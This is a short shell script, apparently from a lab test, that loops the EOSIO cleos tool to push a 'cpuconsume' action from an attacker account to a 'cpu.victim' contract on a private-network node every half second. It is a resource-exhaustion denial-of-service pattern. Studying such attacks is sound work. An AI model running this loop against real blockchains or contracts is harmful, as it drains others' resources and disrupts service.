while true
do
	cleos -u http://192.168.2.91:8889 push action cpu.victim cpuconsume '["cpu.att111",50]' -p cpu.att111@active
	sleep 0.5
done
